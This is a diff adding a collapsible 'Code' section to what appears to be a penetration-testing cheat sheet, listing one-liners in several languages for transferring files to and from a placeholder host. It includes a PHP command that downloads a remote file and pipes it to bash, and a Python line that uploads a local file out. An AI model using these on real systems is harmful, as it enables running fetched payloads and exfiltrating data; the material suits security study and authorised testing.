@@ -504,3 +504,115 @@ php -S 0.0.0.0:8000
 
 ---
 
+<details>
+<summary><h1>💻 Code</h1></summary>
+&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h2>📥 Downloads</h2></summary>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>Python</h3></summary>
+
+**Python 3**
+```python
+python3 -c 'import urllib.request;urllib.request.urlretrieve("http://<IP>:<PORT>/<FILE>", "<OUTPUT FILE>")'
+```
+
+**Python 2**
+```python
+python2.7 -c 'import urllib;urllib.urlretrieve ("http://<IP>:<PORT>/<FILE>", "<OUTPUT FILE>")'
+```
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>PHP</h3></summary>
+
+**PHP Download with File_get_contents()**
+```php
+php -r '$file = file_get_contents("http://<IP>:<PORT>/<FILE>"); file_put_contents("<OUTPUT FILE>",$file);'
+```  
+  
+**PHP Download with Fopen()**
+```php
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("http://<IP>:<PORT>/<FILE>", "rb"); $flocal = fopen("<OUTPUT FILE>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+```    
+
+**PHP Download a File and Pipe it to Bash**
+```php
+php -r '$lines = @file("http://<IP>:<PORT>/<FILE>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```    
+
+
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>Ruby</h3></summary>
+
+```ruby
+ruby -e 'require "net/http"; File.write("<OUTPUT FILE>", Net::HTTP.get(URI.parse("http://<IP>:<PORT>/<FILE>")))'
+```
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>Perl</h3></summary>
+
+```perl
+perl -e 'use LWP::Simple; getstore("http://<IP>:<PORT>/<FILE>", "<OUTPUT FILE>");'
+```
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>JavaScript</h3></summary>
+
+**Create the script wget.js**
+```javascript
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+```  
+  
+**Execute the script in Windows (CMD or Powershell)**
+```cmd
+cscript.exe /nologo wget.js http://<IP>:<PORT>/<FILE> <OUTPUT FILE>
+```    
+
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>VBScript</h3></summary>
+
+**Create the script wget.vbs**
+```vb
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```  
+  
+**Execute the script in Windows (CMD or Powershell)**
+```cmd
+cscript.exe /nologo wget.vbs http://<IP>:<PORT>/<FILE> <OUTPUT FILE>
+```    
+
+</details>
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h2>📤 Uploads</h2></summary>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>Python</h3></summary>
+
+**Python 3**
+```python
+python3 -c 'import requests;requests.post("http://<IP>:<PORT>/uploads/path/",files={"files":open("<LOCAL FILE>")})'
+```
+</details>
+</details>
+</details>
+
+---
